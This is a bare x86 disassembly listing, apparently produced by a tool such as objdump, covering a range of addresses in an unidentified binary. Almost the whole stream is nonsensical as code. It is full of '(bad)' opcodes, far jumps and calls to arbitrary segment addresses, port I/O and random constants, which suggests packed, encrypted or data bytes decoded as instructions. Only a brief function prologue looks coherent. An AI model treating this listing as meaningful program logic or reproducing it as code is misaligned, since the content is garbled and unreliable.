  405828:	dec    esp
  405829:	hlt    
  40582a:	push   ecx
  40582b:	sbb    ah,BYTE PTR [ebp+0x7d006e85]
  405831:	pop    ds
  405832:	dec    ebx
  405833:	sbb    al,0x3f
  405835:	retf   0x4876
  405838:	push   edx
  405839:	jmp    0x6d24:0xa00122a7
  405840:	and    BYTE PTR [esi-0x692f5267],bh
  405846:	mov    ch,0xfd
  405848:	sbb    ch,BYTE PTR [eax-0x4a]
  40584b:	and    ah,cl
  40584d:	pop    edi
  40584e:	jnp    0x4058b4
  405850:	cdq    
  405851:	pop    esi
  405852:	jge    0x4057dc
  405854:	pop    es
  405855:	mov    WORD PTR fs:[esi+ebp*1-0x5a],gs
  40585a:	jg     0x405859
  40585c:	(bad)  
  40585d:	adc    eax,0x6de80e9b
  405862:	or     BYTE PTR [esi],0xb1
  405865:	repz jg 0x40587e
  405868:	mov    ah,0x79
  40586a:	sub    edi,edx
  40586c:	jge    0x4058a7
  40586e:	inc    ebx
  40586f:	in     eax,0x17
  405871:	pop    ds
  405872:	xchg   esi,eax
  405873:	and    eax,0x992ec774
  405878:	mov    edi,0x664a95f2
  40587d:	push   es
  40587e:	rol    dl,0x6
  405881:	cmp    esi,DWORD PTR [esi-0x2e]
  405884:	test   eax,0x34552e3c
  405889:	stos   DWORD PTR es:[edi],eax
  40588a:	cdq    
  40588b:	aad    0x49
  40588d:	std    
  40588e:	mov    ebp,0xc5d78f97
  405893:	fist   DWORD PTR [ebp-0x761414f0]
  405899:	dec    ebp
  40589a:	add    eax,DWORD PTR [edi]
  40589c:	clc    
  40589d:	adc    cl,bh
  40589f:	mov    bh,0x58
  4058a1:	(bad)  
  4058a2:	pop    edi
  4058a3:	cs inc ebx
  4058a5:	retf   
  4058a6:	xchg   ecx,eax
  4058a7:	ss scas al,BYTE PTR es:[edi]
  4058a9:	xchg   ebx,eax
  4058aa:	lods   al,BYTE PTR ds:[esi]
  4058ab:	sub    BYTE PTR [eax+0x6b],0xdd
  4058af:	aaa    
  4058b0:	shl    DWORD PTR [esi+0x1e8e035c],cl
  4058b6:	push   ecx
  4058b7:	push   edi
  4058b8:	mov    bh,BYTE PTR [edi-0x4226ac76]
  4058be:	in     al,dx
  4058bf:	in     eax,dx
  4058c0:	add    al,0x1e
  4058c2:	pusha  
  4058c3:	mov    DWORD PTR [eax+esi*1+0x19c92d0f],ebp
  4058ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058cb:	loope  0x4058f9
  4058cd:	je     0x40594a
  4058cf:	jl     0x40591e
  4058d1:	loop   0x4058c8
  4058d3:	pop    ebx
  4058d4:	fwait
  4058d5:	in     eax,dx
  4058d6:	data16 test bh,cl
  4058d9:	jmp    0x405922
  4058db:	jns    0x4058b2
  4058dd:	push   eax
  4058de:	mov    bh,0xe6
  4058e0:	enter  0xb079,0xe8
  4058e4:	cmp    al,0x44
  4058e6:	or     dh,BYTE PTR [ebx]
  4058e8:	aas    
  4058e9:	sbb    cl,bl
  4058eb:	inc    esp
  4058ec:	sbb    edi,DWORD PTR [ebp+0x5b]
  4058ef:	shr    DWORD PTR [ecx+eax*4+0x4c6bb64a],1
  4058f6:	outs   dx,BYTE PTR ds:[esi]
  4058f7:	stc    
  4058f8:	jnp    0x40590d
  4058fa:	icebp  
  4058fb:	call   0x9157:0x14ac2252
  405902:	out    dx,al
  405903:	mul    DWORD PTR [ebx]
  405905:	push   eax
  405906:	test   al,0x3
  405908:	mov    eax,0x8d5bca50
  40590d:	(bad)  
  40590e:	rcl    DWORD PTR [edx+0x6b480cc2],1
  405914:	clc    
  405915:	mov    esp,0x715385e5
  40591a:	shr    ch,1
  40591c:	stos   DWORD PTR es:[edi],eax
  40591d:	add    al,0xde
  40591f:	pop    edi
  405920:	xor    ch,BYTE PTR [ecx-0x42]
  405923:	sub    ebx,0x64
  405926:	pop    eax
  405927:	cmp    eax,DWORD PTR [ebp+0x1e07f8b5]
  40592d:	jp     0x405903
  40592f:	test   BYTE PTR [edi-0x73],dh
  405932:	lods   al,BYTE PTR ds:[esi]
  405933:	jo     0x4058d4
  405935:	xchg   esi,eax
  405936:	mov    bl,0xb2
  405938:	jnp    0x405966
  40593a:	nop
  40593b:	inc    eax
  40593c:	dec    ecx
  40593d:	adc    edx,DWORD PTR [esi+0x24]
  405940:	mov    eax,0x3b1ad465
  405945:	or     eax,edx
  405947:	sub    al,0xbc
  405949:	mov    al,ds:0x7b7a7f4b
  40594e:	call   0xff03:0x1380545a
  405955:	mov    al,ds:0x608d7e8b
  40595a:	loopne 0x4059d0
  40595c:	iret   
  40595d:	pop    edx
  40595e:	retf   0x16b7
  405961:	shr    DWORD PTR [ebp-0x72f3397e],0xe
  405968:	imul   ebp,DWORD PTR [edi+0x6097eb4e],0x12d1c9f2
  405972:	rcr    dl,cl
  405974:	pop    esp
  405975:	mov    ebp,0xb0635675
  40597a:	ins    DWORD PTR es:[edi],dx
  40597b:	jg     0x405981
  40597d:	rcr    BYTE PTR [edi+0x757ad345],cl
  405983:	loop   0x4059ae
  405985:	loopne 0x40593c
  405987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405988:	xchg   esi,eax
  405989:	fcomp  DWORD PTR [edi-0x27]
  40598c:	jmp    0xcd7b:0x85c22be9
  405993:	add    ecx,DWORD PTR [edx]
  405995:	jge    0x4059e7
  405997:	fsub   QWORD PTR [esi]
  405999:	sahf   
  40599a:	jecxz  0x405936
  40599c:	adc    bh,BYTE PTR [eax]
  40599e:	sub    DWORD PTR [ecx+0x215550ca],edx
  4059a4:	jmp    0xb281:0x492eaf81
  4059ab:	mov    ds:0x1d277bd5,eax
  4059b0:	stos   BYTE PTR es:[edi],al
  4059b1:	imul   ecx,DWORD PTR [esi],0xf24e4a7a
  4059b7:	and    al,0xbb
  4059b9:	adc    DWORD PTR [ecx],eax
  4059bb:	adc    DWORD PTR [ecx+0x5fae408f],eax
  4059c1:	and    bh,BYTE PTR [edx+ecx*4]
  4059c4:	rcl    DWORD PTR [ebx],cl
  4059c6:	sub    esp,DWORD PTR [ebx-0x11]
  4059c9:	call   0xf144:0xf8f84945
  4059d0:	iret   
  4059d1:	mov    edi,0x99c35464
  4059d6:	cli    
  4059d7:	xchg   esp,eax
  4059d8:	sub    DWORD PTR [esi],esi
  4059da:	jnp    0x40596d
  4059dc:	mov    al,ah
  4059de:	cmp    ch,0xe
  4059e1:	stos   DWORD PTR es:[edi],eax
  4059e2:	addr16 jno 0x4059ae
  4059e5:	mov    ds:0xac1da7ac,eax
  4059ea:	out    dx,eax
  4059eb:	jo     0x4059fd
  4059ed:	(bad)  
  4059f0:	out    dx,eax
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a3c
  405a20:	cld    
  405a21:	jmp    0x4d78:0x78386751
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a83
  405a2c:	add    ch,BYTE PTR [esi]
  405a2e:	fimul  WORD PTR ds:0x99901921
  405a34:	xor    ch,BYTE PTR [esi-0x5]
  405a37:	and    eax,0x85b082a7
  405a3c:	shl    DWORD PTR [edi+0x1517440e],1
  405a42:	ret    
  405a43:	push   ss
  405a44:	jecxz  0x405a58
  405a46:	push   0x49
  405a48:	mov    ah,0x70
  405a4a:	into   
  405a4b:	clc    
  405a4c:	push   ebx
  405a4d:	add    DWORD PTR [edx],edx
  405a4f:	push   ebp
  405a50:	rcr    ebx,cl
  405a52:	lods   eax,DWORD PTR ds:[esi]
  405a53:	mov    edi,0x34aa1c91
  405a58:	pop    es
  405a59:	or     cl,cl
  405a5b:	add    dh,BYTE PTR [esi+0x5d]
  405a5e:	(bad)  
  405a5f:	test   al,0xfa
  405a61:	xchg   esp,eax
  405a62:	adc    edi,DWORD PTR ds:0x17fd09dc
  405a68:	add    esi,edx
  405a6a:	clc    
  405a6b:	loop   0x405a19
  405a6d:	fdivr  st(5),st
  405a6f:	adc    al,ch
  405a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a72:	mov    ds:0x7068302d,al
  405a77:	add    esp,DWORD PTR [edx]
  405a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a7a:	jl     0x405ad1
  405a7c:	or     BYTE PTR [ebx],dh
  405a7e:	adc    BYTE PTR [edx],ah
  405a80:	or     esi,DWORD PTR [ecx-0x15]
  405a83:	clc    
  405a84:	in     al,dx
  405a85:	dec    ebp
  405a86:	dec    edi
  405a87:	std    
  405a88:	adc    ch,ch
  405a8a:	jmp    0x405a12
  405a8c:	dec    edx
  405a8d:	jno    0x405a23
  405a8f:	xchg   esi,eax
  405a90:	jmp    0xfed53e5b
  405a95:	xchg   esp,eax
  405a96:	xlat   BYTE PTR ds:[ebx]
  405a97:	jmp    0x11c6:0x5e02efd
  405a9e:	or     BYTE PTR [ecx-0x16b59022],cl
  405aa4:	xor    edi,edi
  405aa6:	retf   0x84a1
  405aa9:	xchg   ebx,eax
  405aaa:	popa   
  405aab:	mov    ss,WORD PTR [esi-0x9cb630c]
  405ab1:	xor    esi,DWORD PTR [ebx+0x41763977]
  405ab7:	pop    ebx
  405ab8:	hlt    
  405ab9:	and    ebp,esp
  405abb:	je     0x405acb
  405abd:	adc    BYTE PTR [esi-0x278156e1],dl
  405ac3:	dec    eax
  405ac4:	arpl   WORD PTR [ebp+0x39],sp
  405ac7:	pop    eax
  405ac8:	mov    bl,0x33
  405aca:	sbb    ecx,esi
  405acc:	mov    ecx,0x539d5a17
  405ad1:	cs pop edi
  405ad3:	push   0x17
  405ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad6:	not    ch
  405ad8:	ins    BYTE PTR es:[edi],dx
  405ad9:	test   BYTE PTR [ebx],dl
  405adb:	out    dx,al
  405adc:	add    dh,ch
  405ade:	inc    ebx
  405adf:	mov    ebp,0xef6bb14c
  405ae4:	cmp    edi,ebp
  405ae6:	push   ebp
  405ae7:	pop    esp
  405ae8:	test   BYTE PTR [esi],dl
  405aea:	div    edi
  405aec:	adc    dh,BYTE PTR [edi+ebx*1+0x241e5b83]
  405af3:	mov    ecx,0xf9248fa6
  405af8:	pop    edx
  405af9:	sub    eax,0x250da0da
  405afe:	bound  edx,QWORD PTR [ebx+0x6bac4fe3]
  405b04:	add    BYTE PTR [ecx-0x7e9085d8],bh
  405b0a:	adc    BYTE PTR [edx],ch
  405b0c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405b0e:	jno    0x405b4a
  405b10:	ror    DWORD PTR [esp+ebx*8-0x3bc7d3d3],1
  405b17:	lea    edx,[eax+0x63]
  405b1a:	pop    eax
  405b1b:	sub    edx,DWORD PTR [eax+0x23542482]
  405b21:	mov    esi,0x3bcdf380
  405b26:	sti    
  405b27:	cmp    DWORD PTR [edx],ebx
  405b29:	mov    eax,0xf91ae31c
  405b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b2f:	add    DWORD PTR [ecx-0x12],ebx
  405b32:	xor    al,BYTE PTR [ebx+ebp*1+0x5e511851]
  405b39:	stos   DWORD PTR es:[edi],eax
  405b3a:	mov    WORD PTR [ecx-0x46],?
  405b3d:	push   0xffffffef
  405b3f:	stos   BYTE PTR es:[edi],al
  405b40:	jp     0x405b86
  405b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b43:	in     eax,dx
  405b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b45:	mov    cl,0xaf
  405b47:	or     al,0xfa
  405b49:	test   DWORD PTR [edi+0x50],ebx
  405b4c:	cmp    eax,0x959fa07a
  405b51:	pop    ebp
  405b52:	dec    esi
  405b53:	adc    ebx,DWORD PTR [edi+0x8e84eae]
  405b59:	jge    0x405b86
  405b5b:	sbb    eax,0xf5624e95
  405b60:	jnp    0x405b6c
  405b62:	pop    eax
  405b63:	add    eax,DWORD PTR [eax+0x4f8dff05]
  405b69:	and    al,0x49
  405b6b:	dec    ebx
  405b6c:	push   ebx
  405b6d:	push   edx
  405b6e:	ficom  WORD PTR [ecx]
  405b70:	dec    esi
  405b71:	dec    esp
  405b72:	cmc    
  405b73:	xchg   ebx,eax
  405b74:	dec    ebp
  405b75:	data16 (bad) 
  405b77:	cld    
  405b78:	mov    ecx,0xa8d6287f
  405b7d:	mov    esp,0x2f2c9b25
  405b82:	or     eax,0x9d3881b3
  405b87:	xchg   BYTE PTR [edi-0x35576e6],ch
  405b8d:	mov    bh,0x80
  405b8f:	xor    cl,bl
  405b91:	xchg   edi,eax
  405b92:	adc    edi,DWORD PTR [edx-0x73]
  405b95:	mov    bh,0x73
  405b97:	jnp    0x405b7b
  405b99:	(bad)  
  405b9a:	ret    
  405b9b:	repz fst DWORD PTR [ebx+0x4363a8f6]
  405ba2:	or     al,0xc1
  405ba4:	xor    ch,BYTE PTR [ecx-0x3f]
  405ba7:	cs lock mul ah
  405bab:	jle    0x405bc6
  405bad:	mov    dh,0x3b
  405baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb0:	test   DWORD PTR es:[ecx+eax*8],edx
  405bb4:	xchg   esp,eax
  405bb5:	push   esp
  405bb6:	seto   BYTE PTR [ecx+0x740c3a5]
  405bbd:	push   esp
  405bbe:	ins    DWORD PTR es:[edi],dx
  405bbf:	or     ch,BYTE PTR [edi]
  405bc1:	sub    al,0x1a
  405bc3:	aam    0x4e
  405bc5:	retf   0x991f
  405bc8:	inc    edi
  405bc9:	xchg   esi,eax
  405bca:	pop    edx
  405bcb:	(bad)  
  405bcc:	in     eax,0xc8
  405bce:	mov    WORD PTR [ebx+0x48e50391],?
  405bd4:	inc    esi
  405bd5:	scas   eax,DWORD PTR es:[edi]
  405bd6:	add    eax,0xfd1486a2
  405bdb:	ror    BYTE PTR ds:0xf5640052,0xb
  405be2:	mov    al,ds:0x1be9d3f3
  405be7:	pop    esi
  405be8:	cli    
  405be9:	mov    cl,0x21
  405beb:	jge    0x405c24
  405bed:	dec    edi
  405bee:	mov    dl,0x34
  405bf0:	push   0x51b11ac4
  405bf5:	dec    ebx
  405bf6:	cdq    
  405bf7:	xor    al,0x18
  405bf9:	loope  0x405c02
  405bfb:	test   bh,ah
  405bfd:	jecxz  0x405bf9
  405bff:	icebp  
  405c00:	mov    ebp,0x6e2dc841
  405c05:	pop    edi
  405c06:	data16 sbb al,0x59
  405c09:	mov    bl,0xd
  405c0b:	sbb    BYTE PTR [esi+0x65],cl
  405c0e:	test   ebx,eax
  405c10:	xchg   esp,eax
  405c11:	and    eax,0xff67a888
  405c16:	mov    gs,WORD PTR ds:0x520d9187
  405c1c:	cmp    eax,0x31fdcfee
  405c21:	jg     0x405c89
  405c23:	sub    BYTE PTR [ebp-0x3d],bl
  405c26:	test   al,0xa1
  405c28:	pop    ecx
  405c29:	rcl    BYTE PTR [edx+0x49],0xe5
  405c2d:	aam    0x96
  405c2f:	cmp    BYTE PTR [ebp-0x56],ah
  405c32:	je     0x405bc4
  405c34:	adc    al,0xb6
  405c36:	lods   al,BYTE PTR ds:[esi]
  405c37:	aad    0x4d
  405c39:	ror    BYTE PTR [edx-0x2238c94e],0x68
  405c40:	push   ds
  405c41:	(bad)  
  405c42:	cmp    DWORD PTR [eax],esi
  405c44:	sbb    DWORD PTR [ebx+edi*1-0x69],eax
  405c48:	inc    edx
  405c49:	mov    esi,0x3d00a68
  405c4e:	mov    dl,0x2b
  405c50:	in     eax,dx
  405c51:	loop   0x405ca6
  405c53:	xlat   BYTE PTR ds:[ebx]
  405c54:	test   eax,0xb776c0b5
  405c59:	pop    ss
  405c5a:	outs   dx,DWORD PTR ds:[esi]
  405c5b:	sbb    DWORD PTR [ebp+0x2444539e],0x4e
  405c62:	popa   
  405c63:	adc    al,0x5f
  405c65:	in     eax,dx
  405c66:	or     al,0x79
  405c68:	int    0x12
  405c6a:	push   edi
  405c6b:	inc    edi
  405c6c:	fidiv  WORD PTR [edx+0x37d78d02]
  405c72:	out    0x46,al
  405c74:	adc    esi,DWORD PTR [edx]
  405c76:	loop   0x405c57
  405c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c79:	xlat   BYTE PTR ss:[ebx]
  405c7b:	xchg   edx,eax
  405c7c:	push   ebp
  405c7d:	adc    al,0xae
  405c7f:	xor    BYTE PTR [edi+0x16],cl
  405c82:	push   ds
  405c83:	cmp    al,0x6b
  405c85:	es loop 0x405c16
  405c88:	rcl    edx,0x60
  405c8b:	js     0x405d05
  405c8d:	and    BYTE PTR [ebx+0x3bb02d77],dl
  405c93:	mov    ecx,0x1cd74d7a
  405c98:	lds    ecx,FWORD PTR [edx-0x32e8fb20]
  405c9e:	sbb    eax,0x52e1b5a4
  405ca3:	pop    ebp
  405ca4:	outs   dx,BYTE PTR ds:[esi]
  405ca5:	dec    eax
  405ca6:	es mov esp,0xda0b731a
  405cac:	cwde   
  405cad:	jno    0x405ccc
  405caf:	mov    al,0x6d
  405cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb2:	and    ecx,esp
  405cb4:	and    ah,dl
  405cb6:	int    0x51
  405cb8:	in     al,dx
  405cb9:	dec    esp
  405cba:	(bad)  
  405cbb:	cmp    ah,dl
  405cbd:	xor    DWORD PTR [ebx],0x5f
  405cc0:	xor    dh,BYTE PTR [ebp-0x46]
  405cc3:	aas    
  405cc4:	inc    esi
  405cc5:	inc    eax
  405cc6:	dec    ebx
  405cc7:	nop
  405cc8:	push   ss
  405cc9:	sar    BYTE PTR [edx-0x6e],cl
  405ccc:	fimul  DWORD PTR [edx]
  405cce:	sub    BYTE PTR [eax-0xdc6b00a],al
  405cd4:	test   dh,cl
  405cd6:	push   esp
  405cd7:	aaa    
  405cd8:	sbb    eax,0xb6c515a9
  405cdd:	adc    ch,dh
  405cdf:	pop    esi
  405ce0:	add    eax,0xb5cc7283
  405ce5:	pop    es
  405ce6:	in     eax,0x1
  405ce8:	pop    ecx
  405ce9:	add    dl,ch
  405ceb:	fiadd  DWORD PTR [eax-0x35]
  405cee:	int    0x69
  405cf0:	xor    ebx,ecx
  405cf2:	mov    dh,0xd8
  405cf4:	mov    edi,0x2bb62edb
  405cf9:	jae    0x405d3b
  405cfb:	(bad)  
  405cfc:	xor    dl,BYTE PTR [edx]
  405cfe:	xor    edx,edx
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x25984c09
  405d13:	add    ebx,DWORD PTR [eax]
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d42
  405d1e:	and    edi,esi
  405d20:	jnp    0x405cb1
  405d22:	pop    edx
  405d23:	jo     0x405cfe
  405d25:	sbb    al,ch
  405d27:	sbb    DWORD PTR [eax],ebp
  405d29:	push   0xffffffea
  405d2b:	mov    ch,0xe9
  405d2d:	pop    ds
  405d2e:	test   BYTE PTR [edi],ch
  405d30:	test   eax,ebp
  405d32:	or     eax,0x26741107
  405d37:	rcl    DWORD PTR [ecx-0x3e],0x52
  405d3b:	inc    esi
  405d3c:	sbb    esi,DWORD PTR ds:0x9e1c06c3
  405d42:	xor    dl,BYTE PTR [ebx-0x1]
  405d45:	mov    esp,0x4e9a161a
  405d4a:	(bad)  
  405d4b:	pop    esp
  405d4c:	imul   esi,DWORD PTR [edi+0x3b],0x81b8b0bd
  405d53:	cmc    
  405d54:	in     eax,0x97
  405d56:	push   cs
  405d57:	and    esi,ebp
  405d59:	inc    eax
  405d5a:	(bad)  
  405d5e:	les    edi,FWORD PTR [ecx-0x51]
  405d61:	sub    al,0x7e
  405d63:	mov    WORD PTR [ebp+0x27a1368f],es
  405d69:	dec    esp
  405d6a:	std    
  405d6b:	mov    WORD PTR [edi-0x2e],?
  405d6e:	pop    ss
  405d6f:	adc    BYTE PTR [ebx],dl
  405d71:	pop    ebp
  405d72:	bound  esi,QWORD PTR ds:[edi+0x44]
  405d76:	sub    al,0x7d
  405d78:	fsub   QWORD PTR [eax-0x42]
  405d7b:	rcl    DWORD PTR [edx+eiz*2+0x40bd7760],1
  405d82:	jecxz  0x405d6c
  405d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d85:	ret    0x5671
  405d88:	retf   
  405d89:	ja     0x405dd0
  405d8b:	lds    esp,FWORD PTR [edi+edi*1]
  405d8e:	inc    esi
  405d8f:	dec    ebx
  405d90:	cmp    BYTE PTR [edx+edx*4],cl
  405d93:	rol    esi,cl
  405d95:	dec    ebp
  405d96:	inc    esi
  405d97:	or     ebx,DWORD PTR [ebp-0x7f882e29]
  405d9d:	das    
  405d9e:	mov    bh,0x86
  405da0:	inc    edx
  405da1:	xor    dh,BYTE PTR [edx+0x1f]
  405da4:	push   esi
  405da5:	out    dx,eax
  405da6:	xchg   edi,eax
  405da7:	xchg   BYTE PTR ds:0xf8d396f3,al
  405dad:	sub    cl,al
  405daf:	or     al,0xae
  405db1:	cmp    eax,0x80129b5d
  405db6:	scas   al,BYTE PTR es:[edi]
  405db7:	inc    ecx
  405db8:	jg     0x405d5b
  405dba:	fwait
  405dbb:	mov    ebx,0xf8a35d3f
  405dc0:	(bad)  
  405dc1:	inc    ecx
  405dc2:	xor    edx,DWORD PTR [ebp-0x10]
  405dc5:	test   al,0x4a
  405dc7:	lods   eax,DWORD PTR ds:[esi]
  405dc8:	add    BYTE PTR [ebx],bl
  405dca:	push   ebx
  405dcb:	in     eax,0xb4
  405dcd:	xchg   esi,eax
  405dce:	sbb    eax,esp
  405dd0:	test   BYTE PTR [edx+ecx*2-0x1ed55f69],dl
  405dd7:	(bad)  [edi-0x52a0fedf]
  405ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dde:	dec    ebx
  405ddf:	fwait
  405de0:	or     ah,al
  405de2:	es das 
  405de4:	push   esi
  405de5:	clc    
  405de6:	ror    DWORD PTR [ebx],0x4f
  405de9:	sub    cl,BYTE PTR [ebx-0x80]
  405dec:	std    
  405ded:	xchg   DWORD PTR [ebx+0x785f54ad],ecx
  405df3:	adc    eax,0x436d87c8
  405df8:	addr16 cs pop eax
  405dfb:	pop    esp
  405dfc:	sti    
  405dfd:	push   ds
  405dfe:	adc    BYTE PTR [ebx+edi*2+0x43],ch
  405e02:	jne    0x405d9b
  405e04:	shr    BYTE PTR [ebx+0x3],cl
  405e07:	or     cl,dh
  405e09:	pop    ds
  405e0a:	xchg   esp,eax
  405e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0c:	mov    edi,DWORD PTR [eax+0x29]
  405e0f:	dec    esi
  405e10:	fwait
  405e11:	(bad)  
  405e12:	arpl   WORD PTR [edx],di
  405e14:	scas   eax,DWORD PTR es:[edi]
  405e15:	xor    DWORD PTR [edx],ebx
  405e17:	cdq    
  405e18:	sub    BYTE PTR [ebp-0x37],dl
  405e1b:	dec    esp
  405e1c:	dec    esp
  405e1d:	int    0x16
  405e1f:	push   0x9882b50f
  405e24:	jbe    0x405dce
  405e26:	adc    al,0x94
  405e28:	sbb    eax,DWORD PTR [ecx]
  405e2a:	call   0x78f1:0xe81e2a71
  405e31:	and    eax,0x80525e26
  405e36:	push   ecx
  405e37:	mov    esi,0xc411bf0f
  405e3c:	pop    ss
  405e3d:	pop    es
  405e3e:	push   esp
  405e3f:	bound  ecx,QWORD PTR [eax+0x26]
  405e42:	ins    BYTE PTR es:[edi],dx
  405e43:	fsubr  QWORD PTR [ecx-0x8]
  405e46:	adc    BYTE PTR [ebx+0x21],dl
  405e49:	pop    esp
  405e4a:	pop    ecx
  405e4b:	loope  0x405dd3
  405e4d:	jo     0x405eb3
  405e4f:	lahf   
  405e50:	inc    ebx
  405e51:	and    ebp,ebp
  405e53:	mov    BYTE PTR [edx+0x38f93528],0x40
  405e5a:	imul   eax,DWORD PTR [edi+0x6f],0xffffff89
  405e5e:	pop    edi
  405e5f:	pop    esi
  405e60:	das    
  405e61:	or     ebx,ebp
  405e63:	and    BYTE PTR [ebx],dh
  405e65:	enter  0xe6ad,0x2
  405e69:	jb     0x405e1d
  405e6b:	dec    ecx
  405e6c:	cli    
  405e6d:	cwde   
  405e6e:	mov    eax,0xb79e740f
  405e73:	pop    esi
  405e74:	ins    DWORD PTR es:[edi],dx
  405e75:	inc    eax
  405e76:	or     DWORD PTR [ebx+0x79],ecx
  405e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7a:	fcmovne st,st(5)
  405e7c:	adc    bh,bh
  405e7e:	popf   
  405e7f:	not    bh
  405e81:	scas   al,BYTE PTR es:[edi]
  405e82:	xor    ebp,DWORD PTR [esi+0x52]
  405e85:	mov    ebp,DWORD PTR [ecx+edi*1+0x58]
  405e89:	fidiv  WORD PTR [edx+0x4cf97668]
  405e8f:	or     al,0x97
  405e91:	push   ebx
  405e92:	push   es
  405e93:	mov    ch,0x81
  405e95:	push   ss
  405e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e97:	ja     0x405e7f
  405e99:	outs   dx,BYTE PTR ds:[esi]
  405e9a:	lds    ebx,FWORD PTR [edi]
  405e9c:	mov    ds:0xddd32192,eax
  405ea1:	cdq    
  405ea2:	pop    es
  405ea3:	sbb    eax,0x80b9e110
  405ea8:	pop    eax
  405ea9:	arpl   WORD PTR [ebx+0x6e36496c],ax
  405eaf:	jp     0x405e32
  405eb1:	fisub  WORD PTR ds:0x3d3d9c52
  405eb7:	popa   
  405eb8:	inc    edi
  405eb9:	adc    eax,DWORD PTR [esi-0x68]
  405ebc:	push   es
  405ebd:	lds    edi,FWORD PTR [esi+0x2b]
  405ec0:	ja     0x405ee0
  405ec2:	xchg   ebx,eax
  405ec3:	mov    bh,0x54
  405ec5:	arpl   WORD PTR [eax],bp
  405ec7:	mov    cl,0xb4
  405ec9:	and    DWORD PTR [esi-0xc12cd2c],esi
  405ecf:	mov    ebx,0xee443881
  405ed4:	add    ch,ah
  405ed6:	xlat   BYTE PTR ds:[ebx]
  405ed7:	add    BYTE PTR [ebx+esi*1-0x16],0xfb
  405edc:	std    
  405edd:	pop    ebx
  405ede:	or     ecx,edi
  405ee0:	lds    edx,FWORD PTR [eax+0x18]
  405ee3:	jo     0x405f47
  405ee5:	mov    ds:0x74ef8a99,al
  405eea:	mov    esp,0x41708e23
  405eef:	xlat   BYTE PTR ds:[ebx]
  405ef0:	outs   dx,DWORD PTR ds:[esi]
  405ef1:	add    ch,BYTE PTR [ebx+0x79372713]
  405ef7:	repz and al,BYTE PTR [ebp+0x263f1c66]
  405efe:	stos   DWORD PTR es:[edi],eax
  405eff:	jnp    0x405f40
  405f01:	popa   
  405f02:	int    0x3d
  405f04:	xor    eax,0xcfd93f6c
  405f09:	add    BYTE PTR [eax+0x38],dl
  405f0c:	pop    edi
  405f0d:	pusha  
  405f0e:	xor    DWORD PTR [ebp+0x2e9f948a],edi
  405f14:	mov    ebx,0x9ed590dc
  405f19:	mov    edi,0xac94325a
  405f1e:	fild   DWORD PTR [ecx-0x7c]
  405f21:	fsubr  DWORD PTR [edi-0x5f]
  405f24:	in     al,0x9c
  405f26:	add    al,bl
  405f28:	push   ds
  405f29:	ror    BYTE PTR [edi-0x1e],1
  405f2c:	mov    ebx,0x33b9b2d2
  405f31:	push   ecx
  405f32:	xchg   esi,eax
  405f33:	aas    
  405f34:	xchg   esp,eax
  405f35:	adc    al,0xc8
  405f37:	imul   esi,eax,0x5647b0bf
  405f3d:	stc    
  405f3e:	inc    esp
  405f3f:	stos   DWORD PTR es:[edi],eax
  405f40:	and    edi,DWORD PTR [edi+ecx*1+0x29]
  405f44:	repnz pop ebp
  405f46:	xor    eax,0x3c05f6a3
  405f4b:	xor    edi,DWORD PTR [ebx]
  405f4d:	push   esi
  405f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f4f:	into   
  405f50:	or     bl,dl
  405f52:	jge    0x405fca
  405f54:	sbb    al,0x88
  405f56:	aad    0xd0
  405f58:	mov    ch,0xa1
  405f5a:	cmp    BYTE PTR [edi-0x7175b33a],bh
  405f60:	push   0xffffff9f
  405f62:	inc    ebp
  405f63:	pop    ecx
  405f64:	xor    al,cl
  405f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f67:	jmp    0x27ecabd6
  405f6c:	lock cdq 
  405f6e:	daa    
  405f6f:	adc    eax,0x85b93c34
  405f74:	inc    ebx
  405f75:	mov    ds:0xa953e905,eax
  405f7a:	scas   al,BYTE PTR es:[edi]
  405f7b:	mov    edi,0x110c019b
  405f80:	xchg   ebx,eax
  405f81:	dec    eax
  405f82:	aam    0x58
  405f84:	mov    dh,0x47
  405f86:	mov    dh,0x43
  405f88:	out    0xf6,al
  405f8a:	fdivr  QWORD PTR [edi-0x38]
  405f8d:	mov    ebp,0x6fe67b6e
  405f92:	(bad)  
  405f93:	mov    eax,0xf34219c7
  405f98:	inc    eax
  405f99:	push   edx
  405f9a:	call   0xa31046
  405f9f:	imul   ecx,DWORD PTR [edx+0x4e45f69d],0xffffffce
  405fa6:	mov    ecx,ss
  405fa8:	mov    ds:0xdfb9095a,eax
  405fad:	aas    
